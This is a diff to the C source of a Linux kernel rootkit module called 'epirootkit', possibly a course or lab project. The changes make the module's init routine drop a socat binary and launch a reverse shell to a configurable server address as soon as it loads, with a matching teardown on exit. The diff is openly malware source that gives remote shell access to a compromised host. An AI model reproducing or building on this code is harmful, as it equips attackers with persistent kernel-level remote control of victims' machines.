@@ -10,9 +10,9 @@
 struct task_struct *network_thread = NULL;
 bool thread_exited = false;
 
-char *ip = "127.0.0.1";
-int port = 4242;
-char *message = "epirootkit: connexion established\n";
+char *ip = SERVER_IP;
+int port = SERVER_PORT;
+char *message = CONNEXION_MESSAGE;
 
 module_param(ip, charp, 0644);
 module_param(port, int, 0644);
@@ -78,6 +78,13 @@ static int __init epirootkit_init(void)
 		return -ENOMEM;
 	}
 
+	if(drop_socat_binaire() != SUCCESS) {
+		pr_err("epirootkit: epirootkit_init: failed to drop socat binary\n");
+		return -FAILURE;
+	}
+
+	launch_reverse_shell();
+
 	// Start a kernel thread that will handle network communication
 	network_thread = kthread_run(network_worker, NULL, "netcom_thread");
 	if (IS_ERR(network_thread)) {
@@ -95,6 +102,8 @@ static int __init epirootkit_init(void)
  */
 static void __exit epirootkit_exit(void)
 {
+	stop_reverse_shell();
+
 	if (network_thread) {
 		if (!thread_exited)
 			kthread_stop(network_thread);
